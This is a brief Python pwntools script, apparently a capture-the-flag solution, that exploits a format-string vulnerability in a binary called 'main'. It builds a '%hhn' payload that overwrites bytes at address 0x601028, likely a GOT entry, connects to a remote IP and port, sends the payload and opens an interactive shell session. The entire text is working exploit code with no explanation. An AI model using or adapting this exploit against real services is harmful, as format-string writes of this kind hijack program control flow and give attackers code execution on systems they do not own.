from pwn import*
payload = '%65c%12$hhn%6c%13$hhn'
payload = payload.ljust(0x20,'\x00')
payload += p64(0x601028 + 1) + p64(0x601028)
p = process('./main')
p = remote('49.235.243.206',10502)
p.sendline(payload)
p.interactive()
